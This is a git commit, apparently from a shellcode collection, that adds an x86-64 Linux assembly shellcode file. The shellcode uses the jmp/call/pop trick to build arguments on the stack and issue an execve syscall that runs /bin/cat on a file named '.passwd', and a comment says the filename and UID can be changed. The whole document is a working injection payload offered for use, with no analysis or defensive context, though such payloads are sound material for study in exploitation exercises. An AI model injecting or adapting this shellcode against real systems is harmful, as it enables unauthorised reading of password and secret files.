67888f6964f1cfacb493db0f201b582e5b2120f1
-TOSH- <tosh@t0x0sh.org>
2015-06-06 14:19:01 +0200

    New shellcode : x86-64 Linux execve('/bin/cat .passwd')

---
+++ shellcodes/linux/x86-64_cat.asm
@@ -0,0 +1,29 @@
+	;; execv("/bin/cat", ["/bin/cat", ".passwd"], [])
+	;; You can change the filename and the UID		
+
+	section .text
+	global _start
+	
+_start:
+	jmp FILENAME
+RET:
+	pop rax
+
+	xor rdx,rdx
+	push rdx
+	mov rcx, '/bin/cat'
+	push rcx
+	mov rdi, rsp
+
+	push rdx
+	push rax
+	push rdi
+	
+	xor rax, rax
+	mov rsi, rsp
+	mov al, 59
+	syscall
+
+FILENAME:
+	call RET
+filename:	db '.passwd', 0x00
